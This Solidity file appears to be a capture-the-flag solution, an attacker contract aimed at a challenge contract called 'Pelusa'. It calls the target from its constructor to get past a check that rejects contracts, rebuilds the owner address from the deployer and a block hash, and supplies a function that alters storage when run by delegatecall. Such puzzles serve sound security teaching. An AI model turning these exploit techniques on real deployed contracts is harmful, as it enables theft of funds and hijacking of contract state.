// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

import {Pelusa} from "./Pelusa.sol";

contract HackerPelusa{
    Pelusa pelusa;
    uint256 slot1;

    address pelusaOwner;
    constructor(Pelusa _pelusa ,address _pelusaDeployer,bytes32 _pelusaBlockHash ){
        pelusa= _pelusa;
        pelusa.passTheBall();
        pelusaOwner=address(uint160(uint256(keccak256(abi.encodePacked(_pelusaDeployer, _pelusaBlockHash)))));
    }

    function getBallPossesion() external view returns(address) {
        return pelusaOwner;
    }

    function handOfGod() external returns(bytes32){
        slot1++;
        return bytes32(uint256(22_06_1986));
    }

}